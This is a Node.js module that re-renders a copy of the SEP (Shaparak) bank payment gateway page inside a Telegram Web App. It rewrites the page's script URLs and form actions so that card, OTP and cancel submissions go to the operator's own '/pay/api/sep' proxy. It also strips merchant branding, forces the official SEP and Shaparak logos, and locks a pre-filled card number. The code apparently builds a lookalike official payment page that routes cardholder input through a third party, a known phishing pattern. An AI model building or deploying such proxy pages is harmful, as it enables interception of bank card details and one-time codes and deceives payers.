"use strict";

const fs = require("fs");
const path = require("path");
const cheerio = require("cheerio");
const { createLogger } = require("./logger");
const { resolveBankSlugFromPan, bankLogoUrl } = require("./bankLogo");

const log = createLogger("renderPage");

let cachedTemplate = null;

function loadTemplate() {
  // Always re-read in case brand HTML/CSS was updated without process restart
  const templatePath = path.join(__dirname, "..", "index.html");
  const next = fs.readFileSync(templatePath, "utf8");
  if (next !== cachedTemplate) {
    cachedTemplate = next;
    log.debug("Gateway HTML template loaded", { templatePath, length: cachedTemplate.length });
  }
  return cachedTemplate;
}

function escapeJsString(value) {
  return String(value ?? "")
    .replace(/\\/g, "\\\\")
    .replace(/"/g, '\\"')
    .replace(/'/g, "\\'")
    .replace(/\n/g, "\\n")
    .replace(/\r/g, "\\r")
    .replace(/</g, "\\u003c")
    .replace(/>/g, "\\u003e")
    .replace(/&/g, "\\u0026");
}

function renderErrorPage(message, zibalId) {
  log.warn("Rendering error page", { message, zibalId });
  return `<!DOCTYPE html>
<html lang="fa_IR">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>خطا — درگاه سپ</title>
  <link href="/pay/assets/css/app.css?v=25" rel="stylesheet">
  <link href="/pay/assets/css/tomanit.css?v=25" rel="stylesheet">
  <meta name="color-scheme" content="light only">
  <style>
    body { display:flex; align-items:center; justify-content:center; min-height:100vh; background:#f7f7fc; }
    .error-card { max-width:480px; margin:24px; padding:32px; background:#fff; border-radius:12px; text-align:center; box-shadow:0 8px 24px rgba(45,58,74,.08); }
    .error-card h1 { color:#2b73e3; margin-bottom:12px; font-size:20px; }
    .error-card p { color:#2d3a4a; line-height:1.8; }
    .error-card a { color:#2b73e3; }
  </style>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <script>
    (function () {
      var CHROME = "#2b73e3";
      document.documentElement.setAttribute("data-theme", "light");
      document.documentElement.style.colorScheme = "light";
      function apply() {
        var tg = window.Telegram && window.Telegram.WebApp;
        if (!tg) return false;
        try { tg.ready(); } catch (e) {}
        try { tg.setHeaderColor && tg.setHeaderColor(CHROME); } catch (e) {}
        try { tg.setBackgroundColor && tg.setBackgroundColor(CHROME); } catch (e) {}
        try { tg.setBottomBarColor && tg.setBottomBarColor("#f7f7fc"); } catch (e) {}
        return true;
      }
      if (!apply()) {
        var n = 0, t = setInterval(function () { if (apply() || ++n >= 20) clearInterval(t); }, 100);
      }
    })();
  </script>
</head>
<body>
  <div class="error-card">
    <h1>خطا در بارگذاری درگاه</h1>
    <p>${escapeHtml(message)}</p>
    ${zibalId ? `<p><a href="/start/${escapeHtml(zibalId)}">تلاش مجدد</a></p>` : ""}
  </div>
</body>
</html>`;
}

function rewriteSepAssetUrl(src) {
  if (!src) return src;
  if (src.startsWith("/assets/")) return src;
  try {
    const url = new URL(src, "https://sep.shaparak.ir");
    if (url.hostname.includes("shaparak.ir") || url.hostname.includes("sep.ir")) {
      return `/api/sep${url.pathname}${url.search}`;
    }
  } catch {
    /* keep original */
  }
  return src;
}

function escapeHtml(value) {
  return String(value)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

const {
  MERCHANT_NAME,
  applyMerchantBranding: brandPayment,
  isPaymentAssistantLabel,
} = require("./merchantBranding");

function renderGatewayPage(payment, zibalId) {
  const branded = brandPayment(payment);
  const merchant = {
    name: branded.merchantName || MERCHANT_NAME,
    terminal: branded.merchantTerminal,
    reference: branded.merchantReference,
    info: branded.merchantInfo || [],
  };

  log.info("Rendering Tomanit gateway page", {
    sessionKey: payment.sessionKey,
    merchantName: merchant.name,
    terminal: merchant.terminal,
    reference: merchant.reference,
    zibalId,
  });

  const $ = cheerio.load(loadTemplate(), { decodeEntities: false });
  $("html").attr("data-theme", "light").attr("style", "color-scheme: light");
  if (!$('meta[name="color-scheme"]').length) {
    $("head").prepend('<meta name="color-scheme" content="light only">');
  } else {
    $('meta[name="color-scheme"]').attr("content", "light only");
  }

  $('script[src="/pay/assets/js/demo.js"], script[src="/assets/js/demo.js"], script[src="assets/js/demo.js"]').remove();

  const sepApiBase = "/pay/api/sep/OnlinePG";
  const sepPostUrl = `${sepApiBase}/OnlinePG`;
  const safeSessionKey = escapeJsString(payment.sessionKey);

  $("script").each((_, el) => {
    const content = $(el).html();
    if (!content || !content.includes("userSessionKey")) return;

    let updated = content
      .replace(/userSessionKey\s*=\s*"[^"]*"/, `userSessionKey = "${safeSessionKey}"`)
      .replace(/hostAddress\s*=\s*"[^"]*"/, `hostAddress = "${sepApiBase}"`)
      .replace(/serverUrl\s*=\s*"[^"]*"/, `serverUrl = "${sepApiBase}"`)
      .replace(/actionUrl\s*=\s*"[^"]*"/, `actionUrl = "${sepPostUrl}"`)
      .replace(/removeEmailUrl\s*=\s*"[^"]*"/, `removeEmailUrl = "${sepApiBase}/Fa/Payment/RemoveEmail"`)
      .replace(/baseUrl:\s*"[^"]*"/, `baseUrl: "${sepApiBase}"`);

    $(el).html(updated);
  });

  $('input[name="SessionKey"]').val(payment.sessionKey);
  $('input[name="__RequestVerificationToken"]').val(payment.verificationToken);
  $("#frmPayment").attr("name", `frmPayment-${payment.sessionKey}`);

  // Forms must POST to SEP proxy — action="#" posts to /pay/start/:id (404).
  $("#frmPayment, #frmCancel, #frmFailedOtp, #frmCulture").attr("action", sepPostUrl);

  $("[data-timeout]").attr("data-timeout", payment.timeout);
  $(".remaining-time").text("00:00");

  $(".merchant-name h2").text(merchant.name);

  // Drop custom brand / merchant photo / پرداخت‌یار. Keep official SEP icon-font mark.
  $(".tomanit-logo, .tomanit-logo-footer, .header .card img.sep-logo, .footer img.sep-logo-mono").remove();
  $(".merchant-logo").remove();
  $(".merchant-info .item").each((_, el) => {
    const label = ($(el).find("span").first().text() || "").trim();
    if (isPaymentAssistantLabel(label)) $(el).remove();
  });

  const sepLogoHtml =
    '<i class="icn-sep" aria-hidden="true"><span class="path1"></span><span class="path2"></span><span class="path3"></span><span class="path4"></span><span class="path5"></span><span class="path6"></span><span class="path7"></span><span class="path8"></span></i>';

  const $sep = $(".header .card > i.icn-sep").first();
  if (!$sep.length) {
    $(".header .card").prepend(sepLogoHtml);
  } else if ($sep.find(".path1").length < 8) {
    $sep.replaceWith(sepLogoHtml);
  }

  if (!$(".header .card .icn-shaparak").length) {
    $(".header .card").append('<i class="icn-shaparak" aria-hidden="true"></i>');
  }

  if (!$(".footer .supervisors .icn-sep-mono").length) {
    $(".footer .supervisors").html('<i class="icn-sep-mono" aria-hidden="true"></i>');
  }

  const lockedPan = String(payment.lockedPan || "").replace(/\D/g, "");
  if (lockedPan.length === 16) {
    const spaced = lockedPan.replace(/(.{4})/g, "$1 ").trim();
    const $pan = $("#CardNumber_PanString");
    $pan
      .val(spaced)
      .addClass("ignore unselect limited")
      .attr("readonly", "readonly")
      .attr("tabindex", "-1");
    $("#CardList").remove();
    $pan.siblings(".clear").remove();

    // Same as fillCard(): show bank logo from BIN
    const slug = resolveBankSlugFromPan(lockedPan);
    const logo = bankLogoUrl(slug);
    $(".card-logo")
      .addClass("is-visible")
      .attr("style", "display:block")
      .empty()
      .append(`<img src="${logo}" alt="" width="24" height="24" />`);
  }

  $(".purchase-value .value h2").text(payment.amount);
  $(".purchase-value .letters small").text(payment.amountLetters);

  const infoItems = $(".merchant-info .item");
  merchant.info.forEach((item, index) => {
    const $item = infoItems.eq(index);
    if (!$item.length) return;
    $item.find("span").first().text(item.label);
    $item.find("em").first().text(item.value);
  });

  if (payment.captchaSrc) {
    $("#CaptchaImage").attr("src", payment.captchaSrc);
  }
  $("#Year").attr("data-current-year", payment.currentYear);

  $("#Purchase").text(`پرداخت\n        ${payment.amount}`);

  let html = $.html();
  // Ensure all local asset paths are under /pay (integrated shell)
  html = html.replace(/(href|src)="\/assets\//g, '$1="/pay/assets/');
  html = html.replace(/(href|src)='\/assets\//g, "$1='/pay/assets/");
  html = html.replace(/tomanit\.css\?v=\d+/g, "tomanit.css?v=25");
  html = html.replace(/app\.css\?v=\d+/g, "app.css?v=25");

  const bankLogoBoot =
    lockedPan.length === 16
      ? `
<script>
(function () {
  function ensureBankLogo() {
    try {
      var panEl = document.getElementById("CardNumber_PanString");
      var box = document.querySelector(".card-logo");
      if (!panEl || !box) return;
      if (box.querySelector("img") && box.classList.contains("is-visible")) return;
      var digits = String(panEl.value || "").replace(/\\D/g, "");
      if (digits.length < 6) return;
      var slug = typeof getBankName === "function" ? getBankName(digits.substring(0, 6)) : null;
      if (!slug) return;
      var base = typeof serverUrl !== "undefined" ? serverUrl : "/pay/api/sep/OnlinePG";
      box.classList.add("is-visible");
      box.style.display = "block";
      box.innerHTML = '<img src="' + base + "/bundle/icn/banks/" + slug + '.svg" width="24" height="24" alt="" />';
    } catch (e) {}
  }
  if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", ensureBankLogo);
  else ensureBankLogo();
  window.addEventListener("load", ensureBankLogo);
})();
</script>`
      : "";

  const deferCaptcha = payment.deferCaptcha
    ? `
<script>
(function () {
  function applyCaptchaSrc(src) {
    if (!src) return;
    var img = document.getElementById("CaptchaImage");
    if (img) img.src = src;
  }
  function bootCaptcha() {
    var sk = typeof userSessionKey !== "undefined" ? userSessionKey : "";
    if (!sk) return;
    fetch("/pay/api/captcha/refresh", {
      method: "POST",
      headers: { "Content-Type": "application/json", Accept: "application/json" },
      body: JSON.stringify({ sessionKey: sk })
    })
      .then(function (r) { return r.json(); })
      .then(function (data) {
        if (data && data.ok) {
          applyCaptchaSrc(data.captchaSrc || (data.image ? ("data:image/JPEG;base64," + data.image) : ""));
          return;
        }
        if (typeof getCaptcha === "function") getCaptcha();
      })
      .catch(function () {
        if (typeof getCaptcha === "function") getCaptcha();
      });
  }
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", bootCaptcha);
  } else {
    bootCaptcha();
  }
})();
</script>`
    : "";

  const themeBoot = `
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<script>
(function () {
  var CHROME = "#2b73e3";
  var BOTTOM = "#f7f7fc";
  document.documentElement.setAttribute("data-theme", "light");
  document.documentElement.style.colorScheme = "light";
  function applyChrome() {
    var tg = window.Telegram && window.Telegram.WebApp;
    if (!tg) return false;
    document.documentElement.setAttribute("data-theme", "light");
    try { tg.ready(); } catch (e) {}
    try { tg.expand && tg.expand(); } catch (e) {}
    try { tg.setHeaderColor && tg.setHeaderColor(CHROME); } catch (e) {}
    try { tg.setBackgroundColor && tg.setBackgroundColor(CHROME); } catch (e) {}
    try { tg.setBottomBarColor && tg.setBottomBarColor(BOTTOM); } catch (e) {}
    return true;
  }
  if (!applyChrome()) {
    var tries = 0;
    var timer = setInterval(function () {
      tries += 1;
      if (applyChrome() || tries >= 20) clearInterval(timer);
    }, 100);
  }
  document.addEventListener("DOMContentLoaded", applyChrome);
  window.addEventListener("load", applyChrome);
})();
</script>${bankLogoBoot}${deferCaptcha}`;
  if (html.includes("</head>")) {
    html = html.replace("</head>", `${themeBoot}\n</head>`);
  } else {
    html += themeBoot;
  }

  log.info("Gateway page rendered", { htmlLength: html.length, deferCaptcha: !!payment.deferCaptcha });
  return html;
}

module.exports = { renderGatewayPage, renderErrorPage, loadTemplate };
